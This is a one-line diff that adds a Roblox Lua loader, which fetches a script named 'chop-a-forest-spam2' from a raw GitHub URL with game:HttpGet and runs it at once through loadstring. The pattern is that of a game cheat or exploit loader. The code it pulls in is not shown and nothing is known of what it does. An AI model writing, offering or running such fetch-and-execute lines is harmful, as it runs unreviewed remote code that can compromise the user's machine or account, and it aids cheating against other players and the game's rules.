@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SlowDamselLog/loaders/main/loaders/chop-a-forest-spam2-nsm4wd6ao7ca0w.lua"))()
